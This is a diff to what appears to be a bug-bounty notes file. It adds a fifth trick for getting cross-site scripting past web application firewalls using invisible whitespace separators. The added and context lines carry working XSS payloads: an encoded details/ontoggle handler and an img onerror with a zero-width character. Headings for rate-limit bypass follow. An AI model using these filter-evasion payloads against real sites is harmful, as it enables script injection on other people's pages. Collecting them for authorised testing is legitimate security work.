@@ -12,6 +12,13 @@ reportError(name , enerror=eval)
 ```
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
 ```
+<br>
+5-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>
+
+```
+<img/src/onerror=alert&#xFEFF;(1337)>
+```
+![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Whitespace%20Separators.jpeg)
 # Rate limit bypass
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
 # Line terminators
